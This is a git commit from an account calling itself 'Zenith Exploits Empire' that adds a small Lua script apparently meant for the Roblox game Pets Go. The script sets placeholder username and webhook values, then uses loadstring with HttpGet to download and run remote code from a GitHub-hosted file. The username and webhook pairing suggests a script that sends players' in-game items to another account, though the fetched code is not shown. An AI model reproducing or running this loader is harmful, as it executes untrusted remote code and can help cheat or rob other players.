92f34af394c120f16c9833a1617f0702b341cfd4
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 08:03:54 +0200

    Added petsgo script: test

---
+++ pets go/test.lua
@@ -0,0 +1,5 @@
+Username = "test"
+Username2 = "test"
+Webhook = "trest"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
